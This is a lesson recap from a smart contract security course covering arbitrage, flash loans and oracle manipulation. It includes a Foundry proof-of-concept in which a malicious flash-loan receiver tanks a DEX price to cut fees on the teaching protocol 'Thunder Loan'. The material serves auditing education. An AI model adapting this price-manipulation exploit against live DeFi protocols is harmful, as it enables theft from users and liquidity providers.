---
title: Oracle Manipulation Recap
---

_Follow along with the video lesson:_

---

### Oracle Manipulation Recap

Alright! Let's review everything up to this point, starting from the top.

### Arbitrage

Arbitrage is the process by which a profit can be made by identifying a price discrepancy of an asset across two exchanges and buying from one then selling on the other. Through this process the asset price becomes normalized across listings.

This is one of the primary use cases of flash loans.

![oracle-manipulation-recap1](/security-section-6/41-oracle-manipulation-recap/oracle-manipulation-recap1.png)

### Flash Loans

A Flash Loan is a loan which lasts for a single transaction. It allows any user to borrow a large number of funds without posting collateral by paying a small fee.

The catch, of course, is that the loan must be repaid in the same transaction in which it is borrowed. If it isn't, the transaction will revert.

The fees collected from flash loans serve as incentive for those supplying liquidity to the flash loan protocol.

In the case of a recognized price discrepancy, this means any user would be able to take greater advantage of the arbitrage opportunity and the greatest profits aren't reserved for whales or those with the most money.

![oracle-manipulation-recap2](/security-section-6/41-oracle-manipulation-recap/oracle-manipulation-recap2.png)

### Oracle Manipulation

Finally, we covered how flash loans and the impact they have on Dex prices of assets can actually be a vulnerability to protocols relying on those Dexs as price oracles.

Flash Loans have the potential of drastically altering the ratio based pricing of asset pairs on Dexs by affording a user the ability to swap huge numbers of a token and tanking it's price - for that transaction.

The practical offshoot of this is that any protocol that reads from that Dex is going to trust this inaccurate, temporary price, leaving itself open to exploitation or unfavorable transactions.

### Thunder Loan Oracle Manipulation

We illustrated that the Thunder Loan protocol was vulnerable to this exact exploit, and we did so with a _very_ thorough proof of code.

It was shown that by flash loaning and swapping on TSwap, an attacker could drastically reduce the cost of the fees to be paid, resulting in a medium severity finding!

<details>
<summary>Oracle Manipulation PoC</summary>

**Proof of Concept:** The following all happens in 1 transaction.

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee1`. During the flash loan, they do the following:
   1. User sells 1000 `tokenA`, tanking the price.
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`.
      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper.

```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```

    3. The user then repays the first flash loan, and then repays the second flash loan.

Add the following to ThunderLoanTest.t.sol.

<details>
<summary>Proof of Code:</summary>

```js
function testOracleManipulation() public {
    // 1. Setup contracts
    thunderLoan = new ThunderLoan();
    tokenA = new ERC20Mock();
    proxy = new ERC1967Proxy(address(thunderLoan), "");
    BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
    // Create a TSwap Dex between WETH/ TokenA and initialize Thunder Loan
    address tswapPool = pf.createPool(address(tokenA));
    thunderLoan = ThunderLoan(address(proxy));
    thunderLoan.initialize(address(pf));

    // 2. Fund TSwap
    vm.startPrank(liquidityProvider);
    tokenA.mint(liquidityProvider, 100e18);
    tokenA.approve(address(tswapPool), 100e18);
    weth.mint(liquidityProvider, 100e18);
    weth.approve(address(tswapPool), 100e18);
    BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
    vm.stopPrank();

    // 3. Fund ThunderLoan
    vm.prank(thunderLoan.owner());
    thunderLoan.setAllowedToken(tokenA, true);
    vm.startPrank(liquidityProvider);
    tokenA.mint(liquidityProvider, 100e18);
    tokenA.approve(address(thunderLoan), 100e18);
    thunderLoan.deposit(tokenA, 100e18);
    vm.stopPrank();

    uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
    console2.log("Normal Fee is:", normalFeeCost);

    // 4. Execute 2 Flash Loans
    uint256 amountToBorrow = 50e18;
    MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
        address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
    );

    vm.startPrank(user);
    tokenA.mint(address(flr), 100e18);
    thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, ""); // the executeOperation function of flr will
        // actually call flashloan a second time.
    vm.stopPrank();

    uint256 attackFee = flr.feeOne() + flr.feeTwo();
    console2.log("Attack Fee is:", attackFee);
    assert(attackFee < normalFeeCost);
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    // 1. Swap TokenA borrowed for WETH
    // 2. Take out a second flash loan to compare fees
    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            // Tanks the price:
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // Second Flash Loan!
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // We repay the flash loan via transfer since the repay function won't let us!
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate the fee and repay
            feeTwo = fee;
            // We repay the flash loan via transfer since the repay function won't let us!
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}
```

</details>

</details>


![oracle-manipulation-recap3](/security-section-6/41-oracle-manipulation-recap/oracle-manipulation-recap3.png)

This section was heavy. Now's a great time to take a break before continuing on.

We're nearly there.
